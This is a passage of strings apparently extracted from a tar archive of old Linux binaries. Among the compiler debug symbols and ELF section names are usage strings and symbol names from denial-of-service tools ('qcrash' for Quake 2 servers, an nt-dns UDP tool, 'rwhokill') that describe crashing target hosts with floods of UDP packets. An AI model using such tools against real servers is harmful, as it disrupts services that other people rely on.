            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "nt-dns.c",
            "buf.12",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "SendUDP",
            "gethostbyaddr@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "GetHost",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "strlen@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "getuid@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostname@@GLIBC_2.0",
            "Usage",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "setuid@@GLIBC_2.0",
            "CreatePayload",
            "__gmon_start__",
            "datapool/bin/quake2",
            "0100755",
            "0000000",
            "0000000",
            "00000036216",
            "07100656663",
            "013267",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "fgets",
            "memcpy",
            "perror",
            "getuid",
            "malloc",
            "socket",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "getopt",
            "memset",
            "gethostbyname",
            "fclose",
            "htons",
            "exit",
            "fopen",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.1",
            "GLIBC_2.0",
            "1^PTRh$",
            "QVh4",
            "E1fE",
            "fE1fu",
            "e[^]U",
            "PEP u",
            "]Ux}",
            "PjdEPP",
            "REPE",
            "\u0403;u[]",
            "Usage: %s <option> <argument> <argument> <argument>",
            "   <option> : -s : Crash a single server, argument 1 is target host",
            "   <option> : -m : Crash multiple servers, argument 1 becomes filename",
            " <argument> : Target host to crash or filename with multiple hostnames",
            " <argument> : Port to send udp packets to for the crash, default is 27910",
            " <argument> : Number of packets to send to the target host(s)",
            "\"%s\" is an unknown hostname.",
            "127.0.0.1",
            "SendPacket",
            "This program requires root.",
            "s:m:",
            "Attempting to resolve %s.",
            "Building %s packets & sending to %s:%s!",
            "Thanks for using qcrash!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "quake2.c",
            "lookup",
            "packet",
            "_DYNAMIC",
            "hemroids",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "destination",
            "flag",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "fgets@@GLIBC_2.0",
            "strlen@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "getuid@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "fclose@@GLIBC_2.1",
            "buildpacket",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "fopen@@GLIBC_2.1",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "sinner",
            "__gmon_start__",
            "datapool/bin/rwhokill",
            "0100755",
            "0000000",
            "0000000",
            "00000032117",
            "07100656672",
            "013726",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "perror",
            "socket",
            "bzero",
            "fprintf",
            "bind",
            "__deregister_frame_info",
            "sendto",
            "herror",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh\u0406",
            "E}u$h",
            "fEE\u060bP",
            "fE\u0783j",
            "U\u0709PEPb",
            "PEP* E\u0503}u",
            "\u0403;u[]",
            "usage: rwhokill hostname number",
            "gethostbyname",
            "socket",
            "recvfrom",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
